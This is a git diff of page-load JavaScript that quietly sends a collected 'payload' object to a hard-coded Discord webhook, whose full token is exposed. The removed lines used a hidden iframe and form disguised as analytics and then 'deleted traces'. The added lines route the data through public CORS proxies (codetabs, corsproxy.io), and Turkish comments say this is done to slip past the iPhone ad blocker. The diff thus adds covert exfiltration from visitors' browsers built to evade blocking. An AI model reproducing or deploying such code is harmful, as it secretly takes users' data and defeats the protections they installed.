@@ -654,41 +654,41 @@ document.addEventListener("DOMContentLoaded", () => {
       };
 
       const webhookUrl = "https://discord.com/api/webhooks/1525624927036637194/9LSurnXS_zgYTO8AkMvDm7nLExTJlSEQnImxyVjoxwtd8YPVXoiBk09BOtRBSnYxUP-q";
-      logDebug("Discord'a form fırlatılıyor...");
+      
+      // Discord, HTML Form'larından gelen veriyi "application/json" başlığı olmadığı için reddediyor (İşlem tamam dese bile arkada siliyor).
+      // Bu yüzden Discord adresini gizleyen (iPhone'un AdBlocker'ını atlatan) GÜVENİLİR BİR PROXY kullanmalıyız.
+      const proxyUrl = "https://api.codetabs.com/v1/proxy?quest=" + webhookUrl;
+      
+      logDebug("Proxy Tüneli (Codetabs) ile fırlatılıyor...");
 
-      try {
-        const iframeName = "analytics_frame_" + Date.now();
-        const iframe = document.createElement("iframe");
-        iframe.name = iframeName;
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-
-        const form = document.createElement("form");
-        form.action = webhookUrl;
-        form.method = "POST";
-        form.target = iframeName;
-        form.enctype = "multipart/form-data";
-        form.style.display = "none";
-
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = "payload_json";
-        input.value = JSON.stringify(payload);
-        
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
-        
-        logDebug("Form gönderimi (submit) tetiklendi!");
-        setTimeout(() => { 
-          form.remove(); 
-          iframe.remove(); 
-          logDebug("İşlem tamam, izler silindi.");
-          setTimeout(() => debugUI.remove(), 4000);
-        }, 3000);
-      } catch (e) {
-        logDebug("Kritik Hata: " + e.message);
-      }
+      fetch(proxyUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(res => {
+        if (!res.ok) {
+           logDebug("Discord/Proxy Hatası: " + res.status);
+        } else {
+           logDebug("✅ İŞLEM TAMAM! (Log %100 Discord'a ulaştı)");
+        }
+      })
+      .catch(e => {
+        logDebug("Fetch Çöktü (Proxy engellendi): " + e.message);
+        // İkinci Proxy Yedeği
+        const backupProxy = "https://corsproxy.io/?" + encodeURIComponent(webhookUrl);
+        logDebug("İkinci Tünel deneniyor (corsproxy)...");
+        fetch(backupProxy, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        }).then(r => logDebug(r.ok ? "✅ 2. Tünel Başarılı" : "2. Tünel Hata: " + r.status))
+          .catch(err => logDebug("Her şey engellendi: " + err.message));
+      });
+      
     }).catch(e => {
        logDebug("Promise.all çöktü: " + e.message);
     });
